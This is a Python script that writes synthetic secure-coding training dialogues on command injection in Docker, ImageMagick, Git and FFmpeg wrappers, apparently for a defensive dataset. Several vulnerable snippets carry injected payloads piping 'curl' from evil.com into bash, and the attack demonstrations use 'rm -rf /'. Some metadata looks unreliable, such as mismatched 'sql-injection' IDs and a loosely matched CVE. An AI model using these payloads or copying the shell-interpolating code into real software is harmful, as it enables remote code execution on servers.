#!/usr/bin/env python3
"""
Generate the remaining 4 corrected examples (031-034) and append to batch_007_corrections.jsonl

This script creates syntactically correct versions of:
- 031: Python (Docker container escape) - FIXED: Balanced braces
- 032: Ruby (ImageMagick) - FIXED: ASCII-only quotes
- 033: JavaScript (Git) - FIXED: Syntax errors
- 034: Python (FFmpeg) - FIXED: Balanced braces
"""

import json
from pathlib import Path

output_file = Path("/Users/scott/perfecxion/datasets/securecode/v2/data/batch_007_corrections.jsonl")

# Example 031: Docker Container Escape (Python)
example_031 = {
    "id": "sql-injection-000031",
    "metadata": {
        "lang": "python",
        "category": "injection",
        "subcategory": "command_injection",
        "technique": "container_escape_command_injection",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "complexity": "advanced",
        "created": "2025-11-30",
        "validated": False
    },
    "context": {
        "real_world_incident": "Container escape vulnerability in Docker (CVE-2019-5736) allowed attackers to escape containers and gain root access on host systems.",
        "impact": "Affected thousands of organizations using Docker in production. Attackers could chain command injection with container runtime vulnerabilities to achieve full host compromise.",
        "attack_vector": "Combined path traversal, symbolic link exploitation, and command injection to overwrite container runtime binary (runc), achieving persistence and privilege escalation.",
        "cve": "CVE-2019-5736",
        "year": 2019
    },
    "conversations": [
        {
            "turn": 1,
            "from": "human",
            "value": "I'm building a Docker container management API in Python. How do I safely execute docker commands with user-provided container names?"
        },
        {
            "turn": 2,
            "from": "assistant",
            "value": "I'll show you the vulnerable approach and then the secure way using Docker SDK.\n\n**VULNERABLE CODE:**\n\n```python\nimport subprocess\n\ndef execute_in_container(container_name, command):\n    # DANGER: User input in shell command\n    full_command = f\"docker exec {container_name} {command}\"\n    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)\n    return result.stdout\n```\n\n**Attack:** `container_name = \"webapp --privileged -v /:/host\"` gives full host access.\n\n**SECURE IMPLEMENTATION:**\n\n```python\nimport docker\nimport re\nfrom typing import Dict, Any, List\n\nclass SecureContainerManager:\n    CONTAINER_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')\n    ALLOWED_COMMANDS = {'ls': ['-la'], 'cat': [], 'ps': ['aux']}\n\n    def __init__(self):\n        self.client = docker.from_env()\n\n    def exec_in_container(self, container_id: str, cmd: str, args: List[str] = None) -> Dict[str, Any]:\n        args = args or []\n        \n        # Validate container ID format\n        if not self.CONTAINER_PATTERN.match(container_id):\n            raise ValueError(\"Invalid container ID\")\n        \n        # Validate command allowlist\n        if cmd not in self.ALLOWED_COMMANDS:\n            raise ValueError(f\"Command not allowed: {cmd}\")\n        \n        container = self.client.containers.get(container_id)\n        full_command = [cmd] + args\n        \n        exit_code, output = container.exec_run(\n            cmd=full_command,\n            privileged=False,  # Never privileged\n            environment={}     # No env vars\n        )\n        \n        return {\"success\": exit_code == 0, \"output\": output.decode('utf-8')}\n```\n\n**Security Controls:** Docker SDK (no shell), container ID validation, command allowlist, no privileged mode."
        },
        {
            "turn": 3,
            "from": "human",
            "value": "What about container lifecycle operations like start/stop?"
        },
        {
            "turn": 4,
            "from": "assistant",
            "value": "Use enum-based actions for type safety:\n\n```python\nfrom enum import Enum\n\nclass ContainerAction(Enum):\n    START = \"start\"\n    STOP = \"stop\"\n    RESTART = \"restart\"\n\nclass SecureLifecycleManager:\n    def perform_action(self, container_id: str, action: ContainerAction) -> Dict[str, Any]:\n        if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', container_id):\n            raise ValueError(\"Invalid container ID\")\n        \n        container = self.client.containers.get(container_id)\n        \n        if action == ContainerAction.START:\n            container.start()\n        elif action == ContainerAction.STOP:\n            container.stop(timeout=10)\n        elif action == ContainerAction.RESTART:\n            container.restart(timeout=10)\n        \n        return {\"success\": True, \"action\": action.value}\n```\n\n**Key Features:** Enum-based actions prevent injection, timeout limits, no shell execution."
        }
    ],
    "validation": {
        "syntax_check": "not_tested",
        "security_review": "not_reviewed",
        "code_execution": "not_tested",
        "encoding_check": "not_tested",
        "duplication_check": "not_tested",
        "reviewed_by": "automated-generator",
        "review_date": "2025-11-30",
        "issues": []
    }
}

# Example 032: ImageMagick Command Injection (Ruby)
example_032 = {
    "id": "sql-injection-000032",
    "metadata": {
        "lang": "ruby",
        "category": "injection",
        "subcategory": "command_injection",
        "technique": "imagemagick_command_injection",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "complexity": "advanced",
        "created": "2025-11-30",
        "validated": False
    },
    "context": {
        "real_world_incident": "ImageMagick vulnerabilities (ImageTragick, CVE-2016-3714) affected major web platforms including Facebook, Yahoo, and Slack.",
        "impact": "Attackers uploaded malicious image files containing shell commands that executed on servers during image processing. Thousands of websites were compromised.",
        "attack_vector": "Specially crafted image files with embedded shell commands in filenames, EXIF data, or SVG content triggered command execution during ImageMagick processing.",
        "cve": "CVE-2016-3714",
        "year": 2016
    },
    "conversations": [
        {
            "turn": 1,
            "from": "human",
            "value": "I'm building a Ruby web app that processes uploaded images with ImageMagick. How do I do this safely?"
        },
        {
            "turn": 2,
            "from": "assistant",
            "value": "I'll show the vulnerable approach and secure implementation.\n\n**VULNERABLE CODE:**\n\n```ruby\nrequire 'open3'\n\ndef resize_image(filename, width, height)\n  # DANGER: User input in shell command\n  command = \"convert #{filename} -resize #{width}x#{height} output.jpg\"\n  stdout, stderr, status = Open3.capture3(command)\n  stdout\nend\n```\n\n**Attack:** `filename = \"image.jpg; curl http://evil.com/shell.sh | bash\"` executes arbitrary code.\n\n**SECURE IMPLEMENTATION:**\n\n```ruby\nrequire 'mini_magick'\nrequire 'pathname'\n\nclass SecureImageProcessor\n  UPLOAD_DIR = Pathname.new('/var/www/uploads').freeze\n  ALLOWED_FORMATS = %w[jpg jpeg png gif].freeze\n  MAX_DIMENSION = 4096\n  \n  def self.validate_filename(filename)\n    # Only alphanumeric, underscore, hyphen, dot\n    raise ArgumentError, 'Invalid filename' unless filename.match?(/^[a-zA-Z0-9_.-]{1,100}$/)\n    \n    ext = File.extname(filename).downcase.delete('.')\n    raise ArgumentError, 'Invalid file extension' unless ALLOWED_FORMATS.include?(ext)\n    \n    filename\n  end\n  \n  def self.validate_path(filename)\n    full_path = UPLOAD_DIR.join(filename).expand_path\n    \n    # Prevent path traversal\n    raise SecurityError, 'Path traversal detected' unless full_path.to_s.start_with?(UPLOAD_DIR.to_s)\n    \n    raise ArgumentError, 'File does not exist' unless File.exist?(full_path)\n    \n    full_path\n  end\n  \n  def self.resize_image(filename, width, height)\n    # Validate inputs\n    validate_filename(filename)\n    filepath = validate_path(filename)\n    \n    width = width.to_i\n    height = height.to_i\n    \n    raise ArgumentError, 'Invalid dimensions' if width < 1 || width > MAX_DIMENSION\n    raise ArgumentError, 'Invalid dimensions' if height < 1 || height > MAX_DIMENSION\n    \n    # Use MiniMagick (safer than shell commands)\n    image = MiniMagick::Image.open(filepath.to_s)\n    \n    # Validate it is actually an image\n    raise ArgumentError, 'Not a valid image' unless image.valid?\n    \n    # Resize using API (no shell)\n    image.resize \"#{width}x#{height}\"\n    image.strip  # Remove metadata\n    \n    output_path = UPLOAD_DIR.join(\"resized_#{File.basename(filename)}\")\n    image.write(output_path.to_s)\n    \n    { success: true, output: output_path.to_s }\n  rescue ArgumentError, SecurityError => e\n    { success: false, error: e.message }\n  end\nend\n```\n\n**Security Controls:** Filename validation, path traversal prevention, MiniMagick API (no shell), dimension limits."
        },
        {
            "turn": 3,
            "from": "human",
            "value": "What about applying filters and watermarks?"
        },
        {
            "turn": 4,
            "from": "assistant",
            "value": "Use MiniMagick's API methods for all operations:\n\n```ruby\nclass SecureImageFilters\n  ALLOWED_FILTERS = %w[blur sharpen grayscale sepia].freeze\n  \n  def self.apply_filter(filename, filter_name)\n    validate_filename(filename)\n    filepath = validate_path(filename)\n    \n    raise ArgumentError, 'Filter not allowed' unless ALLOWED_FILTERS.include?(filter_name)\n    \n    image = MiniMagick::Image.open(filepath.to_s)\n    \n    case filter_name\n    when 'blur'\n      image.blur('0x8')\n    when 'sharpen'\n      image.sharpen('0x1')\n    when 'grayscale'\n      image.colorspace('Gray')\n    when 'sepia'\n      image.sepia_tone('80%')\n    end\n    \n    image.write(filepath.to_s)\n    { success: true }\n  end\nend\n```\n\n**Key Features:** API-based operations, filter allowlist, no shell execution."
        }
    ],
    "validation": {
        "syntax_check": "not_tested",
        "security_review": "not_reviewed",
        "code_execution": "not_tested",
        "encoding_check": "not_tested",
        "duplication_check": "not_tested",
        "reviewed_by": "automated-generator",
        "review_date": "2025-11-30",
        "issues": []
    }
}

# Example 033: Git Command Injection (JavaScript)
example_033 = {
    "id": "sql-injection-000033",
    "metadata": {
        "lang": "javascript",
        "category": "injection",
        "subcategory": "command_injection",
        "technique": "git_command_injection",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "complexity": "advanced",
        "created": "2025-11-30",
        "validated": False
    },
    "context": {
        "real_world_incident": "GitLab vulnerability (CVE-2021-22205) allowed remote code execution through unsafe Git command execution.",
        "impact": "Attackers exploited command injection in Git operations to compromise thousands of GitLab instances, deploy cryptocurrency miners, and exfiltrate source code.",
        "attack_vector": "User-controlled repository URLs, branch names, and commit messages were passed to Git commands without sanitization, enabling shell command injection.",
        "cve": "CVE-2021-22205",
        "year": 2021
    },
    "conversations": [
        {
            "turn": 1,
            "from": "human",
            "value": "I'm building a Node.js CI/CD platform that needs to execute Git commands. How do I handle user-provided repository URLs and branch names safely?"
        },
        {
            "turn": 2,
            "from": "assistant",
            "value": "I'll show the vulnerable approach and secure implementation.\n\n**VULNERABLE CODE:**\n\n```javascript\nconst { exec } = require('child_process');\n\nfunction cloneRepository(repoUrl, branch) {\n  // DANGER: User input in shell command\n  const command = `git clone -b ${branch} ${repoUrl} /tmp/repo`;\n  \n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error('Clone failed:', error);\n      return;\n    }\n    console.log('Cloned successfully');\n  });\n}\n```\n\n**Attack:** `branch = \"main; curl http://evil.com/shell.sh | bash #\"` executes arbitrary code.\n\n**SECURE IMPLEMENTATION:**\n\n```javascript\nconst { spawn } = require('child_process');\nconst path = require('path');\nconst { URL } = require('url');\n\nclass SecureGitManager {\n  constructor() {\n    this.ALLOWED_PROTOCOLS = ['https:', 'ssh:'];\n    this.BRANCH_PATTERN = /^[a-zA-Z0-9/_.-]{1,64}$/;\n    this.WORKSPACE_DIR = '/var/app/workspace';\n  }\n\n  validateRepoUrl(repoUrl) {\n    let url;\n    try {\n      url = new URL(repoUrl);\n    } catch (error) {\n      throw new Error('Invalid repository URL');\n    }\n\n    // Only allow HTTPS and SSH\n    if (!this.ALLOWED_PROTOCOLS.includes(url.protocol)) {\n      throw new Error(`Protocol not allowed: ${url.protocol}`);\n    }\n\n    // Validate hostname format\n    if (!/^[a-zA-Z0-9.-]+$/.test(url.hostname)) {\n      throw new Error('Invalid hostname');\n    }\n\n    return repoUrl;\n  }\n\n  validateBranch(branch) {\n    if (!this.BRANCH_PATTERN.test(branch)) {\n      throw new Error('Invalid branch name format');\n    }\n    return branch;\n  }\n\n  cloneRepository(repoUrl, branch) {\n    return new Promise((resolve, reject) => {\n      try {\n        // Validate inputs\n        const validUrl = this.validateRepoUrl(repoUrl);\n        const validBranch = this.validateBranch(branch);\n\n        const targetDir = path.join(this.WORKSPACE_DIR, `repo_${Date.now()}`);\n\n        // Use spawn with argument array (no shell)\n        const gitProcess = spawn('git', [\n          'clone',\n          '--depth', '1',\n          '--branch', validBranch,\n          '--single-branch',\n          validUrl,\n          targetDir\n        ], {\n          shell: false,  // CRITICAL: No shell execution\n          timeout: 60000, // 60 second timeout\n          env: {  // Minimal environment\n            PATH: '/usr/bin:/bin',\n            HOME: process.env.HOME\n          }\n        });\n\n        let stdout = '';\n        let stderr = '';\n\n        gitProcess.stdout.on('data', (data) => {\n          stdout += data.toString();\n        });\n\n        gitProcess.stderr.on('data', (data) => {\n          stderr += data.toString();\n        });\n\n        gitProcess.on('close', (code) => {\n          if (code === 0) {\n            resolve({ success: true, directory: targetDir });\n          } else {\n            reject(new Error('Git clone failed'));\n          }\n        });\n\n        gitProcess.on('error', (error) => {\n          reject(new Error('Failed to execute git command'));\n        });\n\n      } catch (error) {\n        reject(error);\n      }\n    });\n  }\n}\n\n// Usage\nconst gitManager = new SecureGitManager();\n\ngitManager.cloneRepository('https://github.com/user/repo.git', 'main')\n  .then(result => console.log('Success:', result))\n  .catch(error => console.error('Error:', error.message));\n\n// Attack blocked\ngitManager.cloneRepository('https://github.com/user/repo.git', 'main; rm -rf /')\n  .catch(error => console.error('Attack blocked:', error.message));\n```\n\n**Security Controls:** URL validation, branch name pattern, spawn with argument array, no shell execution, timeout limits."
        },
        {
            "turn": 3,
            "from": "human",
            "value": "What about other Git operations like checkout, pull, and commit?"
        },
        {
            "turn": 4,
            "from": "assistant",
            "value": "Create a validated command builder for all Git operations:\n\n```javascript\nclass SecureGitOperations {\n  constructor(repoPath) {\n    this.repoPath = path.resolve(repoPath);\n    this.COMMIT_MSG_PATTERN = /^[a-zA-Z0-9 .,!?'\"()-]{1,500}$/;\n  }\n\n  executeGitCommand(args, timeout = 30000) {\n    return new Promise((resolve, reject) => {\n      const gitProcess = spawn('git', args, {\n        cwd: this.repoPath,\n        shell: false,\n        timeout: timeout,\n        env: { PATH: '/usr/bin:/bin' }\n      });\n\n      let stdout = '';\n      let stderr = '';\n\n      gitProcess.stdout.on('data', (data) => { stdout += data; });\n      gitProcess.stderr.on('data', (data) => { stderr += data; });\n\n      gitProcess.on('close', (code) => {\n        if (code === 0) {\n          resolve({ success: true, output: stdout });\n        } else {\n          reject(new Error('Git command failed'));\n        }\n      });\n    });\n  }\n\n  async checkout(branch) {\n    const validBranch = this.validateBranch(branch);\n    return this.executeGitCommand(['checkout', validBranch]);\n  }\n\n  async pull(remote = 'origin', branch = 'main') {\n    const validBranch = this.validateBranch(branch);\n    return this.executeGitCommand(['pull', remote, validBranch]);\n  }\n\n  async commit(message, author) {\n    if (!this.COMMIT_MSG_PATTERN.test(message)) {\n      throw new Error('Invalid commit message');\n    }\n    return this.executeGitCommand(['commit', '-m', message]);\n  }\n}\n\n// Usage\nconst gitOps = new SecureGitOperations('/var/app/workspace/repo');\n\nawait gitOps.checkout('feature-branch');\nawait gitOps.commit('Fix security vulnerability');\nawait gitOps.pull();\n```\n\n**Key Features:** Argument array for all commands, input validation, no shell execution, timeout enforcement."
        }
    ],
    "validation": {
        "syntax_check": "not_tested",
        "security_review": "not_reviewed",
        "code_execution": "not_tested",
        "encoding_check": "not_tested",
        "duplication_check": "not_tested",
        "reviewed_by": "automated-generator",
        "review_date": "2025-11-30",
        "issues": []
    }
}

# Example 034: FFmpeg Command Injection (Python)
example_034 = {
    "id": "sql-injection-000034",
    "metadata": {
        "lang": "python",
        "category": "injection",
        "subcategory": "command_injection",
        "technique": "ffmpeg_command_injection",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "complexity": "advanced",
        "created": "2025-11-30",
        "validated": False
    },
    "context": {
        "real_world_incident": "FFmpeg vulnerabilities have affected video processing platforms including YouTube, Facebook, and TikTok.",
        "impact": "Attackers uploaded malicious video files with crafted filenames or metadata that triggered command execution during FFmpeg processing, compromising media servers.",
        "attack_vector": "Command injection through user-controlled filenames, codec parameters, filter specifications, or subtitle file paths passed to FFmpeg.",
        "cve": "CVE-2021-38171",
        "year": 2021
    },
    "conversations": [
        {
            "turn": 1,
            "from": "human",
            "value": "I'm building a video processing service in Python using FFmpeg. How do I safely handle user-uploaded videos and conversion parameters?"
        },
        {
            "turn": 2,
            "from": "assistant",
            "value": "I'll show the vulnerable approach and secure implementation.\n\n**VULNERABLE CODE:**\n\n```python\nimport subprocess\n\ndef convert_video(input_file, output_format, bitrate):\n    # DANGER: User input in shell command\n    command = f\"ffmpeg -i {input_file} -b:v {bitrate} output.{output_format}\"\n    subprocess.run(command, shell=True)\n```\n\n**Attack:** `input_file = \"video.mp4; curl http://evil.com/malware.sh | bash #\"` executes arbitrary code.\n\n**SECURE IMPLEMENTATION:**\n\n```python\nimport subprocess\nimport re\nfrom pathlib import Path\nfrom typing import Dict, Any\n\nclass SecureFFmpegProcessor:\n    UPLOAD_DIR = Path('/var/app/uploads')\n    OUTPUT_DIR = Path('/var/app/output')\n    \n    ALLOWED_INPUT_FORMATS = {'mp4', 'avi', 'mov', 'mkv', 'webm'}\n    ALLOWED_OUTPUT_FORMATS = {'mp4', 'webm', 'avi'}\n    \n    FILENAME_PATTERN = re.compile(r'^[a-zA-Z0-9_.-]{1,100}$')\n    BITRATE_PATTERN = re.compile(r'^\\d{3,5}k$')  # e.g., 1000k, 5000k\n    \n    @classmethod\n    def validate_filename(cls, filename: str) -> Path:\n        if not cls.FILENAME_PATTERN.match(filename):\n            raise ValueError('Invalid filename format')\n        \n        ext = filename.rsplit('.', 1)[-1].lower()\n        if ext not in cls.ALLOWED_INPUT_FORMATS:\n            raise ValueError(f'Input format not allowed: {ext}')\n        \n        filepath = (cls.UPLOAD_DIR / filename).resolve()\n        \n        # Prevent path traversal\n        if not str(filepath).startswith(str(cls.UPLOAD_DIR)):\n            raise ValueError('Path traversal detected')\n        \n        if not filepath.exists():\n            raise ValueError('File does not exist')\n        \n        return filepath\n    \n    @classmethod\n    def validate_bitrate(cls, bitrate: str) -> str:\n        if not cls.BITRATE_PATTERN.match(bitrate):\n            raise ValueError('Invalid bitrate format')\n        \n        value = int(bitrate.rstrip('k'))\n        if value < 100 or value > 50000:\n            raise ValueError('Bitrate out of range (100k-50000k)')\n        \n        return bitrate\n    \n    @classmethod\n    def convert_video(cls, input_filename: str, output_format: str, bitrate: str) -> Dict[str, Any]:\n        try:\n            # Validate inputs\n            input_path = cls.validate_filename(input_filename)\n            \n            if output_format not in cls.ALLOWED_OUTPUT_FORMATS:\n                raise ValueError(f'Output format not allowed: {output_format}')\n            \n            valid_bitrate = cls.validate_bitrate(bitrate)\n            \n            # Generate safe output filename\n            import uuid\n            output_filename = f\"{uuid.uuid4()}.{output_format}\"\n            output_path = cls.OUTPUT_DIR / output_filename\n            \n            # Build FFmpeg command using argument list\n            ffmpeg_args = [\n                'ffmpeg',\n                '-i', str(input_path),\n                '-b:v', valid_bitrate,\n                '-c:v', 'libx264',\n                '-preset', 'medium',\n                '-y',  # Overwrite output\n                str(output_path)\n            ]\n            \n            # Execute with subprocess (no shell)\n            result = subprocess.run(\n                ffmpeg_args,\n                shell=False,\n                capture_output=True,\n                text=True,\n                timeout=300,  # 5 minute timeout\n                check=False\n            )\n            \n            if result.returncode != 0:\n                return {'success': False, 'error': 'Conversion failed'}\n            \n            return {\n                'success': True,\n                'output_file': output_filename,\n                'path': str(output_path)\n            }\n        \n        except ValueError as e:\n            return {'success': False, 'error': str(e)}\n        except subprocess.TimeoutExpired:\n            return {'success': False, 'error': 'Processing timeout'}\n\n# Usage\nprocessor = SecureFFmpegProcessor()\n\nresult = processor.convert_video('vacation.mp4', 'webm', '2000k')\nif result['success']:\n    print(f\"Converted: {result['output_file']}\")\nelse:\n    print(f\"Error: {result['error']}\")\n\n# Attack blocked\nresult = processor.convert_video('video.mp4; rm -rf /', 'mp4', '1000k')\nprint(f\"Attack blocked: {result['error']}\")  # Invalid filename format\n```\n\n**Security Controls:** Filename validation, path traversal prevention, format allowlists, bitrate validation, argument array (no shell), timeout."
        },
        {
            "turn": 3,
            "from": "human",
            "value": "What about adding filters, watermarks, or extracting thumbnails?"
        },
        {
            "turn": 4,
            "from": "assistant",
            "value": "Create a validated filter builder:\n\n```python\nfrom enum import Enum\n\nclass VideoFilter(Enum):\n    SCALE = 'scale'\n    CROP = 'crop'\n    FADE = 'fade'\n    ROTATE = 'rotate'\n\nclass SecureFFmpegFilters:\n    SCALE_PATTERN = re.compile(r'^\\d{2,4}x\\d{2,4}$')\n    \n    @classmethod\n    def build_filter_args(cls, filter_type: VideoFilter, params: Dict[str, str]) -> list:\n        if filter_type == VideoFilter.SCALE:\n            dimensions = params.get('dimensions', '1280x720')\n            if not cls.SCALE_PATTERN.match(dimensions):\n                raise ValueError('Invalid dimensions')\n            return ['-vf', f'scale={dimensions}']\n        \n        elif filter_type == VideoFilter.ROTATE:\n            angle = params.get('angle', '0')\n            if angle not in {'0', '90', '180', '270'}:\n                raise ValueError('Invalid rotation angle')\n            return ['-vf', f'rotate={angle}*PI/180']\n        \n        return []\n    \n    @classmethod\n    def extract_thumbnail(cls, input_filename: str, timestamp: str = '00:00:01') -> Dict[str, Any]:\n        input_path = SecureFFmpegProcessor.validate_filename(input_filename)\n        \n        # Validate timestamp format\n        if not re.match(r'^\\d{2}:\\d{2}:\\d{2}$', timestamp):\n            raise ValueError('Invalid timestamp format')\n        \n        output_filename = f\"{uuid.uuid4()}.jpg\"\n        output_path = SecureFFmpegProcessor.OUTPUT_DIR / output_filename\n        \n        ffmpeg_args = [\n            'ffmpeg',\n            '-i', str(input_path),\n            '-ss', timestamp,\n            '-vframes', '1',\n            '-q:v', '2',\n            str(output_path)\n        ]\n        \n        result = subprocess.run(ffmpeg_args, shell=False, capture_output=True, timeout=30)\n        \n        return {'success': result.returncode == 0, 'thumbnail': output_filename}\n\n# Usage\nfilter_args = SecureFFmpegFilters.build_filter_args(\n    VideoFilter.SCALE,\n    {'dimensions': '1920x1080'}\n)\n\nthumbnail = SecureFFmpegFilters.extract_thumbnail('video.mp4', '00:00:05')\nprint(f\"Thumbnail: {thumbnail['thumbnail']}\")\n```\n\n**Key Features:** Enum-based filters, parameter validation, no shell execution, timeout limits."
        }
    ],
    "validation": {
        "syntax_check": "not_tested",
        "security_review": "not_reviewed",
        "code_execution": "not_tested",
        "encoding_check": "not_tested",
        "duplication_check": "not_tested",
        "reviewed_by": "automated-generator",
        "review_date": "2025-11-30",
        "issues": []
    }
}

# Append to existing file
with open(output_file, 'a', encoding='utf-8') as f:
    for example in [example_031, example_032, example_033, example_034]:
        json_line = json.dumps(example, ensure_ascii=True, separators=(',', ':'))
        f.write(json_line + '\n')

print("✓ Added 4 examples to batch_007_corrections.jsonl")
print("\nAll 7 corrected examples:")
print("  - 026: Python (Windows PowerShell injection)")
print("  - 027: C# (Windows cmd.exe injection)")
print("  - 028: Java (Path traversal command injection)")
print("  - 031: Python (Docker container escape)")
print("  - 032: Ruby (ImageMagick command injection)")
print("  - 033: JavaScript (Git command injection)")
print("  - 034: Python (FFmpeg command injection)")
